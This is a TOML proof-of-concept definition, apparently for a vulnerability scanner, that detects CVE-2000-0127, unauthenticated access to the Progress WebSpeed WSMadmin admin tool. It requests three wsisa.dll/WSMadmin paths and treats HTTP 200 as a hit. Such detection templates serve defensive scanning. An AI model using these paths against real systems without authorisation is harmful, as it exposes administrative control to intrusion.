[info]
author = "ave"
description = "Progress WebSpeed 配置程序未正确禁用对 WSMadmin 管理工具的访问控制，远程攻击者可通过访问 wsisa.dll 相关管理路径绕过认证获取管理权限。本 PoC 通过请求典型 wsisa.dll/WSMadmin 管理入口，检测目标是否暴露未授权管理界面，不对系统做任何修改，属于安全无损验证。"
id = "POC-AVE-2000-0115"
name = "CVE-2000-0127 WebSpeed WSMadmin 未授权访问 PoC"
severity = "high"
tags = ["ave-2000-0115"]
vuln_id = [
    "CVE-2000-0127",
    "AVE-2000-0115",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/cgi-bin/wsisa.dll/WSMadmin"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/scripts/wsisa.dll/WSMadmin"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests]]
method = "GET"
path = "/wsisa.dll/WSMadmin"
protocol = "http"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"
